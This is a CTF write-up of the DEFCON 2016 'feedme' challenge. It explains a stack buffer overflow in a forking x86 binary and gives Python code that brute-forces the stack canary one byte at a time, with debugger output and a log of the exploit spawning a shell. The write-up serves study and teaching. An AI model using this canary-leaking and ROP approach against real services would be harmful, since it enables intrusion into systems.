+++
title = "DEFCON CTF 2016 - feedme"
authors = ["hugsy"]
date = 2016-05-23T00:00:00Z
updated = 2016-05-23T00:00:00Z

[taxonomies]
categories = ["ctf"]
tags = ["pwn","defcon-2016","x86","brop"]
+++

### Info ###

The vulnerable file was given with the instructions:

    :::text
    Don't forget to feed me
    http://www.scs.stanford.edu/brop/

Here are some info given by `gef`:
```bash
gef➤  !file ./feedme
./feedme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
gef➤  checksec
[+] checksec for '/home/vagrant/feedme'
Canary:                                           No
NX Support:                                       Yes
PIE Support:                                      No
RPATH:                                            No
RUNPATH:                                          No
Partial RelRO:                                    No
Full RelRO:                                       No
```

`feedme` is statically linked x86 binary that forks and then expects "to be fed"
with some input. Pretty simple, right?


### Vulnerability ###

The vulnerability in this case is easy to spot:
```bash
gef➤  c
Continuing.
[New process 1349]
FEED ME!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ATE 41414141414141414141414141414141...
*** stack smashing detected ***: /home/vagrant/feedme terminated

Program received signal SIGABRT, Aborted.
[Switching to process 1349]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[registers]──
$eax     0x00000000 $ebx     0x00000545 $ecx     0x00000545 $edx     0x00000006 $esp     0xffffd388 $ebp     0xffffd5f8
$esi     0xffffd518 $edi     0xffffd434 $eip     0xf7ffdba0 $cs      0x00000023 $ss      0x0000002b $ds      0x0000002b
$es      0x0000002b $fs      0x00000000 $gs      0x00000063 $eflags  [ IF ]
Flags: [ carry  parity  adjust  zero  sign  trap  INTERRUPT  direction  overflow  resume  virtualx86  identification ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[stack]──
0xffffd388│+0x00: 0xffffd5f8 → 0xffffd678 → 0x41414141		← $sp
0xffffd38c│+0x04: 0x6
0xffffd390│+0x08: 0x545
0xffffd394│+0x0c: 0x0807bed7 → cmp eax,0xfffff000
0xffffd398│+0x10: "A"
0xffffd39c│+0x14: 0x0804e3e1 → mov edx,DWORD PTR gs:0x8
0xffffd3a0│+0x18: 0x6
0xffffd3a4│+0x1c: 0xffffd3b4 → " "
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[code:i386]──
0xf7ffdb9b	 <__kernel_vsyscall+11>  nop
0xf7ffdb9b	 <__kernel_vsyscall+11>  nop
0xf7ffdb9c	 <__kernel_vsyscall+12>  nop
0xf7ffdb9d	 <__kernel_vsyscall+13>  nop
0xf7ffdb9e	 <__kernel_vsyscall+14>  int    0x80
0xf7ffdba0	 <__kernel_vsyscall+16>  pop    ebp 		 ← $pc
[...]
```

The interesting function is at 0x08049036:


{{ img(src="https://i.imgur.com/WLAWsAW.png" title="do-feedme") }}

This function basically will:

   1. `0x8049053-0x8049058`: call the `xread_char()` function, which will read 1
      character from stdin and store it in the stack variable (called `len`);
   1. `0x804905F-0x8049069`: use this variable as the number of byte to read from stdin in the call to
      `xread_buffer()`, and store the result in the stack buffer allocated,
      called `buf`, whose size is 0x20 bytes;
   1. `0x804907E-0x8049084`: copy the `buf` content to a bigger array (0x400 bytes) located at the
      address 0x80EBF40.
   1. `0x804909D-0x80490A7`check if the `canary` variable has been tampered with, if so leave in
      error.

So we have a traditional stack buffer overflow, where we need to bypass the
canary token.


### Exploitation ###

Before continuing, I would recommend reading the paper & slides related to the
[blind-rop technique](http://www.scs.stanford.edu/brop/) we're going to be using.

Since the child process is being forked, we know that the parent and child are
identical in every way, including the memory mapping and the canary token. So
the idea for this exploitation is to brute-force one-by-one all the bytes from the
canary variable in stack, with the following binary logic: overwrite one byte of
the canary with a value, `X`. If we have a crash, it will mean that the canary is
corrupted, and therefore `X` is not valid. If it does not crash, then `X` is
valid, and we can reproduce this action with the following canary byte
(this is very analog to the exploitation of a colour-blind SQL
injection exploitation).

So we have this buffer:

```bash
| A A A A A A A A A A A A A A A| 1 2 3 4|
```

If we attempt to corrupt the first byte of the canary with a wrong value, our
process will be killed immediately and we will receive the message ("Child exit"):

```bash
| A A A A A A A A A A A A A A A| X 2 3 4|
```

But when the value for the byte is valid, the program will continue its
execution at 0x080490DF and display a message ("YUM, got...").
```bash
080490DF mov     [esp+4], eax
080490E3 mov     dword ptr [esp], offset aYumGotDBytes ; "YUM, got %d bytes!\n"
080490EA call    xprintf
```

So leaking one byte can be summed with the following Python code:

```python
def leak_canary_byte(s, prefix, off):
    for i in range(256):
        p = 'A'*32 + prefix + chr(i)
        xsend(s, p, len(p) )
        res = s.read_until("\n")
        res2 = s.read_until("\n")
        if res2 != "Child exit.\n":      # if we don't get the "Child exit." message, then our current value is correct
            return chr(i)
    return None
```

Once we have the value of the first byte, we resume the same operation with the
2nd and so on, until having the 4 bytes forming the canary.

```python
def leak_canary(s):
    can = ""
    for i in range(4):
        b = leak_canary_byte(s, can, i)
        if b is None:
            err("bail")
            exit(1)
        ok("Found canary[%d]=%.2x"%(i, ord(b)))
        can += b
    return can
```


We know control the execution flow without triggering the `canary_fail()`
function. All we need to do is build the shellcode using regular ROP. Since the
binary is statically compiled, we have more gadgets than we need.

So wrap this all up in a
[final exploit](https://gist.github.com/hugsy/0f196cfb8c62a4c56fdbc424cb7883bf)
and you have code execution:

```bash
/ $ ./feedme.py                                                                                                                                                                             [18:58]
[+] Connected to 172.28.128.4:4092
[+] Leaking canary using BROP
[+] Found canary[0]=00
[+] Found canary[1]=0c
[+] Found canary[2]=77
[+] Found canary[3]=9a
[+] Using canary '0x9a770c00'
[+] Building shellcode
[+] Sending shellcode
[+] Switching to interactive...
[+] Get a PTY with ' python -c "import pty;pty.spawn('/bin/bash')"   '
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare)
You ran out of time, closing!
```

And find the flag `The flag is: It's too bad! we c0uldn't??! d0 the R0P CHAIN BLIND TOO`
